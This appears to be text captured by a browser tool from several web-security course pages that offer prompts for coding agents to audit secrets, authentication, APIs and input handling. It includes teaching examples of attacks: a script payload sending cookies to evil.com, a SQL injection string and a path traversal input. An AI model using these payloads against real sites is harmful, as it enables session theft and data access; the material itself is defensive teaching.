Prompts to give your coding agent to find and fix security issues.IntroStepsTestingTroubleshootPrerequisitesResourcesFAQQuiz1Why Security Matters Even for Small Apps\"It's just a small side project, who would hack it?\"Everyone thinks this. Then their AWS bill hits $50,000 because someone found their exposed API key and used it to mine crypto.Hackers don't personally target you. Bots scan the entire internet looking for common vulnerabilities. Your \"small project\" shows up in the same scans as Fortune 500 companies.The good news: most attacks are preventable with basic hygiene. You don't need to be a security expert. You need to not leave the door wide open.Security isn't about being unhackable. It's about not being the easiest target.2The Pre-Production Security AuditBefore you deploy anything to production, give your coding agent this prompt:This is your first line of defense. Your coding agent knows code patterns that indicate vulnerabilities. Let it do the heavy lifting.Do a security audit of this codebase. Check for: 1. Hardcoded secrets (API keys, passwords, tokens) 2. Environment variables that might leak to the client 3. SQL injection vulnerabilities 4. XSS (cross-site scripting) vulnerabilities 5. Missing authentication on sensitive endpoints 6. Missing input validation 7. Exposed debug routes or admin panels 8. Insecure dependencies with known vulnerabilities For each issue found, tell me: what the problem is, where it is, how severe it is (critical/high/medium/low), and how to fix it.Run this audit every time before you deploy. Make it a habit.3Check Your Environment VariablesEnvironment variables are how you keep secrets out of your code. But they're easy to misconfigure.Common mistakes:1Putting secrets in files that get committed to git2Using NEXT_PUBLIC_ prefix on secrets (this exposes them to browsers)3Forgetting to add .env to .gitignore4Logging environment variables during debuggingGive your coding agent this prompt:Check my environment variable handling: 1. Is .env in .gitignore? 2. Are any secrets prefixed with NEXT_PUBLIC_, VITE_, or REACT_APP_? (These expose to client) 3. Are any secrets hardcoded in the source code? 4. Are environment variables being logged anywhere? 5. Is there a .env.example file showing what variables are needed (without actual values)? Fix any issues you find.4Check for Exposed Secrets in Git HistoryEven if you removed a secret from your code, it might still be in your git history. Anyone with access to the repo can see every version of every file.This is a critical check.Search the git history for accidentally committed secrets: 1. Run: git log -p | grep -i \"api_key\\|apikey\\|secret\\|password\\|token\\|credential\" 2. Check if any .env files were ever committed 3. Look for any hardcoded keys that were later removed If you find exposed secrets, tell me which ones need to be rotated (get new keys and invalidate old ones).If you find a secret in git history, assume it's compromised. Rotate it immediately. Don't just delete the file - the history is still there.5Check Authentication and AuthorizationAuthentication = who you are. Authorization = what you're allowed to do.Common issues:1API routes that should require login but don't2Users able to access other users' data by changing an ID3Admin functions accessible to regular users4Password reset flows that leak informationAudit authentication and authorization: 1. List all API routes/endpoints in this project 2. For each route, tell me: Does it require authentication? Should it? 3. Check if users can access other users' data by changing IDs in requests 4. Are admin routes properly protected? 5. Are there any routes that should be private but are public? Fix any issues you find.6Check Input ValidationNever trust user input. Ever.Anything that comes from a user (form fields, URL parameters, file uploads, API requests) should be validated before you use it.Without validation, attackers can:1Inject SQL into your database queries2Inject JavaScript into your pages (XSS)3Upload malicious files4Cause your server to crash with unexpected inputCheck input validation across the codebase: 1. Find all places where user input is accepted (forms, API endpoints, URL parameters) 2. For each one, check: Is the input validated? Is it sanitized before use? 3. Are file uploads checking file type and size? 4. Is user input ever directly used in database queries or HTML output? Add proper validation where it's missing.7Check Dependencies for VulnerabilitiesYour app isn't just your code. It's also the hundreds of packages you depend on. Any of them could have security vulnerabilities.Good news: there are tools that scan for this automatically.Run npm audit (or yarn audit) to check for vulnerable dependencies. For each vulnerability: 1. Tell me what it is and how severe 2. Is there a patched version available? 3. If yes, update the package 4. If no patch exists, is there a workaround or alternative package? Prioritize critical and high severity issues.Run npm audit fix to auto-fix what can be safely updated. Some fixes require manual review.8Check Database SecurityIf you have a database, it's a prime target.Common issues:1Database accessible from the internet without authentication2Using default credentials3Not using parameterized queries (hello SQL injection)4Storing passwords in plain text5Not encrypting sensitive dataAudit database security: 1. Is the database only accessible from my application servers (not the public internet)? 2. Are we using parameterized queries/prepared statements for all database operations? 3. Are passwords hashed (not stored as plain text)? 4. Is sensitive data (SSNs, credit cards, etc.) encrypted? 5. Are database credentials strong and unique? Fix any issues.9Check for Information LeakageYour app might be accidentally telling attackers useful information.Common leaks:1Detailed error messages in production (showing stack traces, file paths)2API responses that include more data than needed3Debug endpoints left enabled4Server headers revealing software versions5Source maps deployed to productionCheck for information leakage: 1. Are detailed error messages/stack traces shown in production? 2. Do API responses include unnecessary fields (like password hashes, internal IDs)? 3. Are there any debug routes or endpoints that should be removed? 4. Are source maps being deployed to production? 5. Is the server revealing its software version in headers? Fix any issues.In production, show users friendly error messages. Log the detailed errors server-side for debugging.10Check HTTPS and Security HeadersHTTPS encrypts traffic between users and your server. Without it, anyone on the same network can see everything.Security headers add extra protection against common attacks.Check HTTPS and security headers: 1. Is HTTPS enforced? (HTTP should redirect to HTTPS) 2. Is HSTS (HTTP Strict Transport Security) enabled? 3. Are these security headers set: - Content-Security-Policy - X-Content-Type-Options - X-Frame-Options - X-XSS-Protection If not, add them. Show me the configuration.Most hosting platforms (Vercel, Railway, Netlify) handle HTTPS automatically. Headers you usually need to configure yourself.11The Quick Security ChecklistPrint this out.

The stuff that costs people thousands when they get it wrong.IntroStepsTestingDeployTroubleshootPrerequisitesResourcesFAQQuiz1What Are Environment Variables?Environment variables are settings that live outside your code.Instead of writing:const apiKey = 'sk-abc123def456'You write:const apiKey = process.env.API_KEYThe actual value comes from the environment where your code runs. Different environments (your laptop, production server, testing server) can have different values. And crucially - the actual secret never touches your code.Think of environment variables like settings you configure on the machine, not in the code.2The .env FileA .env file stores environment variables for local development. It's a simple text file:DATABASE_URL=postgres://user:pass@localhost:5432/mydb API_KEY=sk-abc123def456 SECRET_TOKEN=my-super-secret-tokenYour code reads from this file during development. It should NEVER be committed to git.Help me set up environment variables for this project: 1. Create a .env file for local development 2. Create a .env.example file (same variables but with placeholder values) 3. Make sure .env is in .gitignore 4. Update the code to read from environment variables instead of hardcoded values3The .env.example FileWhile .env contains your actual secrets and should never be committed, .env.example shows what variables are needed without revealing actual values:DATABASE_URL=your_database_url_here API_KEY=your_api_key_here SECRET_TOKEN=your_secret_token_hereThis gets committed to git. New developers copy it to .env and fill in their own values.Always include a .env.example. Future you will thank present you.4The Critical Mistake: Client-Side SecretsThis is where people mess up most often.In React/Next.js: Variables starting with NEXT_PUBLIC_ or REACT_APP_ are bundled into your JavaScript and sent to browsers.In Vite: Variables starting with VITE_ are exposed to the client.Anyone can open browser dev tools and see these values.Rule: Never put secrets in client-side code. API keys for external services should only be used server-side.Audit my codebase for client-side secret exposure: 1. Find all environment variables prefixed with NEXT_PUBLIC_, REACT_APP_, or VITE_ 2. Check if any of these are actual secrets (API keys, tokens, passwords) 3. If yes, these are exposed to the client - show me how to move them server-side 4. Create a list of which variables are safe for client vs must stay server-only5Git and Secrets: The Horror StoriesTrue stories:1A developer committed AWS keys to a public repo. Within 4 hours, $6,000 in charges from crypto miners.2A startup pushed Stripe production keys. Fraudsters processed $200,000 in fake transactions.3A company's database credentials leaked. All customer data downloaded and held for ransom.Bots scan every public commit on GitHub within seconds. If your secret hits a public repo, assume it's compromised immediately.Even private repos aren't safe. Employees leave, repos get shared, backups get exposed. Treat git history as permanent and public.6What to Do When You Leak a SecretLeaked a secret? Here's the emergency playbook:1Rotate immediately. Generate a new key, don't just delete the old one.2Revoke the old key. Go to the service's dashboard and deactivate it.3Check for damage. Look at usage logs for the compromised key.4Fix the leak. Remove from code, add to .gitignore, etc.5Git history is forever. Removing a file doesn't remove it from history. The secret is still there.I accidentally committed a secret to git. Help me: 1. Identify exactly where the secret is (which files, which commits) 2. Generate a new API key from [service name] 3. Update my .env and deployment environment with the new key 4. Revoke/delete the old key from the service dashboard 5. Add proper .gitignore rules to prevent this again7Different Platforms, Different ApproachesEach hosting platform has its own way of handling environment variables.Vercel: Dashboard > Project > Settings > Environment VariablesRailway: Dashboard > Project > Variables tabNetlify: Site settings > Build & deploy > EnvironmentAWS/GCP/Azure: Use their secrets managers (AWS Secrets Manager, etc.)Heroku: Settings > Config VarsNever use .env files in production. Use the platform's secret management.Each platform encrypts secrets at rest. Much safer than .env files on a server.8Server vs Client: The Golden RuleHere's the rule that prevents 90% of secret leaks:Server-only secrets:•Database credentials•API keys for external services•JWT secrets•Encryption keys•Anything that would be bad if publicSafe for client:•Public API keys (like Google Maps public key)•Feature flags•App configuration (non-sensitive)•Analytics IDsWhen in doubt, keep it server-side.Review my environment variables and categorize them: 1. Which ones MUST stay server-side only? 2. Which ones are safe for client-side? 3. Are any secrets currently exposed to the client that shouldn't be? 4. Show me how to restructure if needed9Setting Up Secrets in ProductionWhen you deploy, you need to set environment variables in your hosting platform. Here's the workflow:1Never commit actual secrets to git2Use .env locally for development3Set the same variables in your hosting platform's dashboard4Each environment (dev, staging, production) should have its own secrets5Use different API keys for development vs production when possibleHelp me set up environment variables for production deployment: 1. List all the environment variables my app needs 2. Which ones need different values in production vs development? 3. Show me the commands or steps to set these in [platform name] 4. Verify my app will work with these variables set10The Environment Variable ChecklistBefore every deploy, check:Setup:.env is in .gitignore.env.example exists with placeholder valuesNo secrets are hardcoded in source filesClient Safety:No secrets use NEXT_PUBLIC_, REACT_APP_, or VITE_ prefixAll API keys for external services are server-side onlyProduction:All required variables are set in hosting platformProduction uses different keys than developmentOld/unused secrets have been revokedProgress: 0 / 10 steps completed© 2025 Ken Kai"},{"type":"text","text":"\n\nTab Context:\n- Executed on tabId: 1254428117\n- Available tabs:\n  • tabId 1254428117: \"Ken Kai - Environment Variables & Secrets Course\" (https://www.kenkais.com/exclusive/course/environment-secrets)"}]}}

The prompts that help your coding agent build secure APIs that don't leak data.IntroStepsTestingTroubleshootPrerequisitesResourcesFAQQuiz1Authentication vs AuthorizationTwo words that sound the same but mean different things:Authentication: Proving who you are.\"I am user@example.com, here's my password to prove it.\"Authorization: Proving what you're allowed to do.\"I'm authenticated, but can I delete this post? Only if it's my post.\"Most security bugs are authorization bugs. The user is logged in (authenticated) but can access things they shouldn't (authorization failure).Authentication: Are you who you say? Authorization: Can you do what you're asking?2The Authentication AuditFirst step: make sure every route that should require login actually does.This prompt has your coding agent map out your entire API and identify gaps:Audit authentication across all API routes: 1. List every API endpoint in this project 2. For each endpoint, state: - Does it currently require authentication? - SHOULD it require authentication? 3. Flag any endpoints that are unprotected but should be protected 4. Show me how to add authentication to the unprotected routes3The Authorization AuditAuthentication is the easy part. Authorization is where things get tricky.Common authorization bugs:1User A can see User B's data by changing the ID in the URL2Regular users can access admin endpoints3Users can modify resources they don't own4Deleted users can still access their old dataAudit authorization across all API routes: 1. Find all endpoints that access user-specific data 2. For each one, check: Does it verify the requesting user owns/has access to this data? 3. Can User A access User B's data by changing an ID? 4. Are admin-only routes properly restricted? 5. Fix any authorization gaps you find4Rate LimitingWithout rate limiting, an attacker can:1Brute force passwords (try millions of guesses)2Scrape your entire database3DDoS your server by flooding it with requests4Abuse your API to rack up your costsRate limiting sets boundaries: \"You can only make X requests per minute.\"Add rate limiting to this API: 1. Identify sensitive endpoints (login, signup, password reset, data-heavy queries) 2. Add rate limiting - suggested limits: - Login: 5 attempts per minute per IP - Signup: 10 per hour per IP - General API: 100 per minute per user 3. Return 429 Too Many Requests with Retry-After header when limited 4. Log rate limit violations for monitoringStart strict, loosen if legitimate users complain. Easier than starting loose and getting abused.5CORS (Cross-Origin Resource Sharing)CORS controls which websites can make requests to your API.By default, browsers block requests from one website to another. CORS headers tell the browser \"it's okay, I allow requests from these origins.\"Common mistakes:1Setting Access-Control-Allow-Origin: * (allows anyone)2Reflecting the Origin header back (also allows anyone)3Not understanding that CORS only affects browsers, not server-to-server requestsConfigure CORS properly for this API: 1. What origins should be allowed? (my frontend domain only) 2. What methods should be allowed? (GET, POST, PUT, DELETE as needed) 3. What headers should be allowed? 4. Set up CORS to only allow my frontend, not the whole internet 5. Make sure credentials (cookies) are handled correctly6Secure Your ResponsesYour API might be leaking information in its responses.Common leaks:1Including password hashes in user objects2Returning internal IDs or database structure3Detailed error messages revealing system info4Returning more data than the client needsAudit API responses for information leakage: 1. For each endpoint, check what data is returned 2. Flag any sensitive fields being returned (password hashes, internal IDs, etc.) 3. Are error messages revealing internal details? 4. Create response DTOs that only include necessary fields 5. Standardize error responses to not leak information7Input Validation on Every EndpointEvery piece of data that comes into your API should be validated.For each input, ask:1Is the type correct? (string, number, etc.)2Is the length/size acceptable?3Does it match expected patterns?4Are special characters handled safely?Add input validation to all API endpoints: 1. List all endpoints and their expected inputs 2. For each input: - What type should it be? - What are valid values/ranges? - How should invalid input be handled? 3. Add validation that rejects bad input before processing 4. Return clear error messages for invalid input8Security HeadersHTTP headers that add extra protection:Essential headers:X-Content-Type-Options: nosniff - Prevents MIME type sniffingX-Frame-Options: DENY - Prevents clickjackingX-XSS-Protection: 1; mode=block - Extra XSS protectionContent-Security-Policy - Controls what resources can loadStrict-Transport-Security - Forces HTTPSAdd security headers to all API responses: 1. Add X-Content-Type-Options: nosniff 2. Add X-Frame-Options: DENY (or SAMEORIGIN if needed) 3. Add X-XSS-Protection: 1; mode=block 4. Consider Content-Security-Policy based on what the API needs 5. Add Strict-Transport-Security for HTTPS enforcement Show me where to configure these (middleware, server config, etc.)9Logging and MonitoringYou can't secure what you can't see.Log these events:1Failed authentication attempts2Authorization failures3Rate limit violations4Unusual request patterns5Errors that might indicate attacksDon't log:1Passwords (even failed ones)2Full credit card numbers3API keys or tokensSet up security logging for this API: 1. Log failed login attempts with IP address 2. Log authorization failures (user tried to access something they shouldn't) 3. Log rate limit violations 4. Make sure passwords and secrets are NEVER logged 5. Show me how to query these logs to spot attacksProgress: 0 / 9 steps completed© 2025 Ken Kai"},{"type":"text","text":"\n\nTab Context:\n- Executed on tabId: 1254428117\n- Available tabs:\n  • tabId 1254428117: \"Ken Kai - API Security Basics Course\" (https://www.kenkais.com/exclusive/course/api-security)"}]}}

The prompts that protect you from SQL injection, XSS, and other attacks that come from bad input.IntroStepsTestingTroubleshootPrerequisitesResourcesFAQQuiz1The Golden Rule: Never Trust User InputAnything that comes from outside your code could be malicious:1Form fields2URL parameters3HTTP headers4File uploads5API request bodies6Cookies7Anything from local storageAssume all of it is trying to hack you. Validate everything.Even data from your own database could be malicious if it was originally user input. Validate on the way in AND sanitize on the way out.2SQL Injection ExplainedSQL injection happens when user input becomes part of a database query.The vulnerable code:const query = `SELECT * FROM users WHERE email = '${email}'`The attack:User enters: ' OR '1'='1' --The result:SELECT * FROM users WHERE email = '' OR '1'='1' --'This returns ALL users because '1'='1' is always true. The -- comments out the rest.The fix: Never concatenate user input into queries. Use parameterized queries.Check this codebase for SQL injection vulnerabilities: 1. Find all database queries 2. Check if any use string concatenation or template literals with user input 3. Convert vulnerable queries to parameterized queries / prepared statements 4. Show me before and after for each fix3XSS (Cross-Site Scripting) ExplainedXSS happens when user input is displayed on a page without sanitization.The vulnerable code:<div>{userComment}</div>The attack:User enters: <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>The result:The script runs in every visitor's browser, stealing their cookies.The fix: Escape HTML characters before displaying user content. Most frameworks do this by default, but you need to be careful with innerHTML and similar.Check this codebase for XSS vulnerabilities: 1. Find all places where user input is displayed in HTML 2. Check if the output is properly escaped 3. Look for dangerous patterns: innerHTML, dangerouslySetInnerHTML, v-html 4. Fix any unescaped output4Validation: The First Line of DefenseValidation means checking that input matches what you expect.For each input field, define:1Type: Is it a string, number, email, URL?2Required: Can it be empty?3Length: Min and max characters4Format: Does it match a pattern (email, phone, etc.)?5Range: For numbers, min and max values6Allowed values: For dropdowns/selections, is it one of the valid options?Add input validation to all user inputs in this codebase: 1. List all places user input is accepted 2. For each input, define what valid input looks like 3. Add validation that rejects invalid input 4. Return clear error messages for invalid input 5. Make sure validation happens BEFORE the input is used anywhere5Server-Side Validation is Non-NegotiableClient-side validation (in the browser) is for user experience. Server-side validation is for security.Why client-side isn't enough:1Attackers can disable JavaScript2Attackers can send requests directly to your API3Browser extensions can modify form data4Client code can be modifiedAlways validate on the server, even if you also validate on the client.Client-side validation: nice to have. Server-side validation: mandatory.6Sanitization: Clean the DataSanitization means cleaning input to remove potentially dangerous content.Common sanitization:1HTML entities: < becomes &lt;2Trim whitespace from strings3Remove or encode special characters4Strip HTML tags from text-only fieldsWhen to sanitize:•Before storing in database (for some cases)•Before displaying in HTML (always)•Before using in file paths (always)Check if output is properly sanitized before display: 1. Find all places where database data is displayed in HTML 2. Verify HTML special characters are escaped 3. Check that user-generated content can't execute scripts 4. If using a framework, verify it auto-escapes (and check for bypasses)7File Upload SecurityFile uploads are high-risk. Attackers can upload:1Executable files (.exe, .php, .js)2Files with fake extensions (malware.jpg is actually malware.exe)3Files that exploit image processing (ImageMagick vulnerabilities)4Huge files to fill your storage5Files with malicious metadataProtect yourself:1Check file type by magic bytes, not just extension2Limit file size3Store uploads outside web root4Generate new filenames (don't use user-provided names)5Scan for malware if possibleAudit file upload security: 1. Find all file upload functionality 2. Check what validations are in place: - File type validation (by content, not just extension) - File size limits - Filename sanitization 3. Where are uploads stored? Are they executable? 4. Add missing protections8URL and Path ValidationWhen user input becomes part of a file path or URL, attackers can do path traversal.The attack:User enters: ../../../etc/passwdThe result:If your code does readFile('/uploads/' + filename), they just read your password file.The fix:1Validate that paths don't contain ..2Validate that paths stay within expected directories3Use built-in path sanitization functionsCheck for path traversal vulnerabilities: 1. Find all places where user input is used in file paths 2. Check if input is validated to prevent ../ attacks 3. Verify paths are constrained to expected directories 4. Add validation to prevent path traversal9The Input Validation ChecklistFor every input in your application:Before processing:Type check (string, number, etc.)Required field checkLength/size limitsFormat validation (email, URL, etc.)Allowed values checkBefore database:Use parameterized queriesNever concatenate input into queriesBefore display:Escape HTML charactersNever use innerHTML with user contentFor file uploads:Check file type by contentLimit file sizeSanitize filenameProgress: 0 / 9 steps completed© 2025 Ken Kai"},{"type":"text","text":"\n\nTab Context:\n- Executed on tabId: 1254428117\n- Available tabs:\n  • tabId 1254428117: \"Ken Kai - Input Validation & Sanitization Course\" (https://www.kenkais.com/exclusive/course/input-validation)"}]}}
